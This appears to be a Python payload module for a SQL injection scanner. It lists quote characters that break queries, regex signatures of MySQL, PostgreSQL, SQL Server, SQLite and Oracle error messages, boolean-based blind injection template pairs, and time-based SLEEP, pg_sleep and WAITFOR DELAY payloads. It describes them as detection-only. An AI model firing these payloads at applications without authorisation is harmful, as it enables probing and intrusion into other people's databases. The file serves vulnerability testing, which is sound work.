"""Payloads and database error signatures.

All payloads are DETECTION-ONLY: they break or test query syntax, but never
read, modify or delete data (no UNION SELECT, no stacked INSERT/UPDATE/DROP).
Payloads are appended to the parameter's original value.
"""

import re

# Characters that break SQL string/number syntax and trigger a database error.
ERROR_PAYLOADS = ["'", '"', "')", '")', "\\", "'\""]

# Regex signatures of database error messages, used for error-based
# detection and for fingerprinting which DBMS is behind the application.
DB_ERROR_SIGNATURES = {
    "MySQL/MariaDB": [
        r"You have an error in your SQL syntax",
        r"check the manual that (?:corresponds|fits) to your (?:MySQL|MariaDB)",
        r"mysqli?_sql_exception",
        r"Warning.{1,80}mysqli?_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"MariaDB server version",
    ],
    "PostgreSQL": [
        r"PostgreSQL.{0,40}ERROR",
        r"pg_(?:query|exec)\(\)",
        r"PSQLException",
        r"unterminated quoted string at or near",
        r"syntax error at or near",
    ],
    "Microsoft SQL Server": [
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Server",
        r"ODBC SQL Server Driver",
        r"SQLServerException",
        r"Incorrect syntax near",
    ],
    "SQLite": [
        r"SQLite3?::",
        r"sqlite3\.OperationalError",
        r"SQLITE_ERROR",
        r"unrecognized token:",
    ],
    "Oracle": [
        r"\bORA-\d{5}",
        r"quoted string not properly terminated",
        r"Oracle.{0,20}Driver",
    ],
}

COMPILED_SIGNATURES = {
    dbms: [re.compile(p, re.I) for p in patterns]
    for dbms, patterns in DB_ERROR_SIGNATURES.items()
}

# Boolean-based blind: (TRUE condition, FALSE condition) templates.
# {a} and {b} are replaced by two different random numbers, so a WAF or
# cache cannot simply memorise one fixed payload. One pair per quoting context.
BOOLEAN_PAIRS = [
    (" AND {a}={a}", " AND {a}={b}"),                    # numeric: id=1 AND 1=1
    ("' AND '{a}'='{a}", "' AND '{a}'='{b}"),            # single-quoted string
    ('" AND "{a}"="{a}', '" AND "{a}"="{b}'),            # double-quoted string
    ("' AND {a}={a}-- -", "' AND {a}={b}-- -"),          # single quote + comment
    (") AND {a}={a}-- -", ") AND {a}={b}-- -"),          # inside parentheses
]

# Time-based blind: (DBMS, template). {d} is the delay in seconds.
# AND (not OR) is used on purpose: OR SLEEP() would sleep once for EVERY row in
# the table, which could tie up the target database (an accidental DoS).
TIME_PAYLOADS = [
    ("MySQL/MariaDB", "' AND SLEEP({d})-- -"),
    ("MySQL/MariaDB", " AND SLEEP({d})"),
    ("MySQL/MariaDB", "\" AND SLEEP({d})-- -"),
    ("PostgreSQL", "' AND 1=(SELECT 1 FROM pg_sleep({d}))-- -"),
    ("PostgreSQL", " AND 1=(SELECT 1 FROM pg_sleep({d}))"),
    ("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("Microsoft SQL Server", "; WAITFOR DELAY '0:0:{d}'-- -"),
]
